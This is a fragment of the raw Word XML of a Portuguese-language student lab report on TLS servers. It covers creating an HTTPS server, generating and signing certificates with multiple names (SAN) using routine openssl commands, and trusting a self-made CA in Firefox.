      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251664384" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="2A0CBCBD" wp14:editId="45B17846">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="column">
              <wp:align>center</wp:align>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>630</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="5943600" cy="5506087"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:wrapSquare wrapText="largest"/>
            <wp:docPr id="182868104"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5506087"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                      <a:prstDash/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:anchor>
        </w:drawing>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
    </w:p>
    <w:bookmarkStart w:id="46" w:name="task-1-tls-client"/>
    <w:bookmarkStart w:id="47" w:name="task-1.d-enviar-e-receber-dados"/>
    <w:bookmarkStart w:id="48" w:name="fetching-de-imagem"/>
    <w:p w14:paraId="1CFE23D0" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="445FF88F" wp14:editId="30CF6BB4">
                <wp:extent cx="5943600" cy="19046"/>
                <wp:effectExtent l="0" t="0" r="19050" b="19054"/>
                <wp:docPr id="630458743" name="Retângulo 13"/>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77A8DAC5" id="Retângulo 1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bookmarkEnd w:id="46"/>
      <w:bookmarkEnd w:id="47"/>
      <w:bookmarkEnd w:id="48"/>
    </w:p>
    <w:p w14:paraId="5CB0AC84" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC" w:rsidP="00392CCA">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="00D72883" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000" w:rsidP="00392CCA">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="49" w:name="_Toc213874707"/>
      <w:bookmarkStart w:id="50" w:name="_Toc213881905"/>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Task 2: TLS Server</w:t>
      </w:r>
      <w:bookmarkEnd w:id="49"/>
      <w:bookmarkEnd w:id="50"/>
    </w:p>
    <w:p w14:paraId="5939D3EC" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo3"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="51" w:name="_Toc213874708"/>
      <w:bookmarkStart w:id="52" w:name="task-2.a-servidor-tls-simples"/>
      <w:bookmarkStart w:id="53" w:name="_Toc213881906"/>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Task 2.a: Servidor TLS Simples</w:t>
      </w:r>
      <w:bookmarkEnd w:id="51"/>
      <w:bookmarkEnd w:id="53"/>
    </w:p>
    <w:p w14:paraId="1A83F6A1" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo4"/>
      </w:pPr>
      <w:r>
        <w:t>Implementação</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53994106" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">O script cria </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
        </w:rPr>
        <w:t>server.py</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> com um servidor HTTPS completo:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39606869" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="SourceCode"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251665408" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="2063A57E" wp14:editId="29D0A918">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="column">
              <wp:align>center</wp:align>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>630</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="5943600" cy="2967356"/>
            <wp:effectExtent l="0" t="0" r="0" b="4444"/>
            <wp:wrapSquare wrapText="largest"/>
            <wp:docPr id="26967130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967356"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                      <a:prstDash/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:anchor>
        </w:drawing>
      </w:r>
      <w:bookmarkStart w:id="54" w:name="implementação"/>
      <w:bookmarkEnd w:id="54"/>
    </w:p>
    <w:p w14:paraId="429246D5" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo4"/>
      </w:pPr>
      <w:r>
        <w:t>Geração de Certificados</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00B4262F" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="SourceCode"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251666432" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="44F3BAC9" wp14:editId="55518C48">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="column">
              <wp:align>center</wp:align>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>630</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="5943600" cy="2623815"/>
            <wp:effectExtent l="0" t="0" r="0" b="5085"/>
            <wp:wrapSquare wrapText="largest"/>
            <wp:docPr id="1421386577"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2623815"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                      <a:prstDash/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:anchor>
        </w:drawing>
      </w:r>
      <w:bookmarkStart w:id="55" w:name="geração-de-certificados"/>
      <w:bookmarkEnd w:id="55"/>
    </w:p>
    <w:p w14:paraId="1A299385" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo4"/>
      </w:pPr>
      <w:bookmarkStart w:id="56" w:name="teste-com-cliente"/>
      <w:r>
        <w:t>Teste com Cliente</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="480D22DE" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="FirstParagraph"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">Com </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>/etc/ssl/certs</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>: FALHA - CA não está no sistema - Cliente não confia no servidor</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AFF83EA" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Usando </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>./client-certs</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve"> com CA</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">: SUCESSO - CA copiada para pasta - </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>c_rehash</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve"> executado - Cliente valida certificado</w:t>
      </w:r>
      <w:bookmarkEnd w:id="52"/>
      <w:bookmarkEnd w:id="56"/>
    </w:p>
    <w:p w14:paraId="77748152" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="57" w:name="_Toc213874709"/>
      <w:bookmarkStart w:id="58" w:name="_Toc213881907"/>
      <w:r>
        <w:t>Task 2.b: Teste com Browser</w:t>
      </w:r>
      <w:bookmarkEnd w:id="57"/>
      <w:bookmarkEnd w:id="58"/>
    </w:p>
    <w:p w14:paraId="4B921469" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo4"/>
      </w:pPr>
      <w:r>
        <w:t>Processo</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E25D018" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>
        </w:numPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Sem CA instalada</w:t>
      </w:r>
      <w:r>
        <w:t>: Browser mostra aviso de segurança</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BACFB4A" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="SourceCode"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>⚠</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
        </w:rPr>
        <w:t>️</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Your connection is not secure</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>SEC_ERROR_UNKNOWN_ISSUER</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4631262A" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Instalar CA no Firefox</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="669202C1" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Compact"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="3"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
        </w:rPr>
        <w:t>about:preferences#privacy</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A809CBA" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Compact"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="3"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Certificates → View Certificates</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="030953A8" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Compact"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="3"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Authorities → Import</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17DAFD78" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Compact"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="3"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Selecionar </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
        </w:rPr>
        <w:t>ca.crt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="473AA93B" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Compact"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="3"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>✓ Trust this CA to identify websites</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="307B1599" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Após instalação</w:t>
      </w:r>
      <w:r>
        <w:t>: Browser aceita conexão</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CF86E43" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Compact"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="3"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Cadeado verde aparece</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61AAFED1" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Compact"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="3"/>
        </w:numPr>
      </w:pPr>
      <w:bookmarkStart w:id="59" w:name="processo"/>
      <w:r>
        <w:t>Página “Bank32” é exibida corretamente</w:t>
      </w:r>
      <w:bookmarkEnd w:id="59"/>
    </w:p>
    <w:p w14:paraId="77FE8924" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo4"/>
      </w:pPr>
      <w:r>
        <w:t>HTML Servido</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AE01586" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="FirstParagraph"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="60" w:name="task-2.b-teste-com-browser"/>
      <w:bookmarkStart w:id="61" w:name="html-servido"/>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>O servidor retorna uma página HTML responsiva com: - Informação sobre segurança SSL/TLS - Badge “SSL/TLS Protected”</w:t>
      </w:r>
      <w:bookmarkEnd w:id="60"/>
      <w:bookmarkEnd w:id="61"/>
    </w:p>
    <w:p w14:paraId="01A6A1CE" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="Ttulo3"/>
        <w:pageBreakBefore/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="709A1381" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="62" w:name="_Toc213874710"/>
      <w:bookmarkStart w:id="63" w:name="_Toc213881908"/>
      <w:r>
        <w:t>Task 2.c: Certificados com Múltiplos Nomes (SAN)</w:t>
      </w:r>
      <w:bookmarkEnd w:id="62"/>
      <w:bookmarkEnd w:id="63"/>
    </w:p>
    <w:p w14:paraId="61EB3A7E" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo4"/>
      </w:pPr>
      <w:r>
        <w:t>Configuração OpenSSL</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="182FD81B" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="SourceCode"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251667456" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="347F8923" wp14:editId="1BBCDB89">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="column">
              <wp:align>center</wp:align>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>630</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="5943600" cy="3217545"/>
            <wp:effectExtent l="0" t="0" r="0" b="1905"/>
            <wp:wrapSquare wrapText="largest"/>
            <wp:docPr id="1343545847"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217545"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                      <a:prstDash/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:anchor>
        </w:drawing>
      </w:r>
      <w:bookmarkStart w:id="64" w:name="configuração-openssl"/>
      <w:bookmarkEnd w:id="64"/>
    </w:p>
    <w:p w14:paraId="7E823F99" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo4"/>
      </w:pPr>
      <w:bookmarkStart w:id="65" w:name="geração"/>
      <w:r>
        <w:t>Geração</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65CECED6" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="SourceCode"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentTok"/>
        </w:rPr>
        <w:t># Gerar CSR com SAN</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="ExtensionTok"/>
        </w:rPr>
        <w:t>openssl</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="NormalTok"/>
        </w:rPr>
        <w:t xml:space="preserve"> req </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="AttributeTok"/>
        </w:rPr>
        <w:t>-newkey</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="NormalTok"/>
        </w:rPr>
        <w:t xml:space="preserve"> rsa:2048 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="AttributeTok"/>
        </w:rPr>
        <w:t>-config</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="NormalTok"/>
        </w:rPr>
        <w:t xml:space="preserve"> server_openssl.cnf </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="DataTypeTok"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="NormalTok"/>
        </w:rPr>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="AttributeTok"/>
        </w:rPr>
        <w:t>-sha256</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="NormalTok"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="AttributeTok"/>
        </w:rPr>
        <w:t>-keyout</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="NormalTok"/>
        </w:rPr>
        <w:t xml:space="preserve"> server.key </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="AttributeTok"/>
        </w:rPr>
        <w:t>-out</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="NormalTok"/>
        </w:rPr>
        <w:t xml:space="preserve"> server.csr</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentTok"/>
        </w:rPr>
        <w:t># Assinar (com copy_extensions = copy)</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="ExtensionTok"/>
        </w:rPr>
        <w:t>openssl</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="NormalTok"/>
        </w:rPr>
        <w:t xml:space="preserve"> ca </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="AttributeTok"/>
        </w:rPr>
        <w:t>-md</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="NormalTok"/>
        </w:rPr>
        <w:t xml:space="preserve"> sha256 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="AttributeTok"/>
        </w:rPr>
        <w:t>-days</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="NormalTok"/>
        </w:rPr>
        <w:t xml:space="preserve"> 3650 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="AttributeTok"/>
        </w:rPr>
        <w:t>-config</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="NormalTok"/>
        </w:rPr>
        <w:t xml:space="preserve"> myopenssl.cnf </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="DataTypeTok"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="NormalTok"/>
        </w:rPr>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="AttributeTok"/>
        </w:rPr>
        <w:t>-in</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="NormalTok"/>
        </w:rPr>
        <w:t xml:space="preserve"> server.csr </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="AttributeTok"/>
        </w:rPr>
        <w:t>-out</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="NormalTok"/>
        </w:rPr>
        <w:t xml:space="preserve"> server.crt </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="AttributeTok"/>
        </w:rPr>
        <w:t>-cert</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="NormalTok"/>
        </w:rPr>
        <w:t xml:space="preserve"> ca.crt </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="AttributeTok"/>
        </w:rPr>
        <w:t>-keyfile</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="NormalTok"/>
        </w:rPr>
        <w:t xml:space="preserve"> ca.key</w:t>
      </w:r>
      <w:bookmarkEnd w:id="65"/>
    </w:p>
    <w:p w14:paraId="49E1C421" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo4"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Verificação</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="752DFE67" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="SourceCode"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="ExtensionTok"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>openssl</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="NormalTok"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> x509 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="AttributeTok"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>-in</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="NormalTok"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> server.crt </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="AttributeTok"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>-noout</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="NormalTok"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="AttributeTok"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>-text</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="NormalTok"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="KeywordTok"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>|</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="NormalTok"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="FunctionTok"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>grep</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="NormalTok"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="AttributeTok"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>-A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="NormalTok"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> 5 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="StringTok"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>"Subject Alternative"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00859C26" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00842992" w:rsidRDefault="00000000">
      <w:pPr>
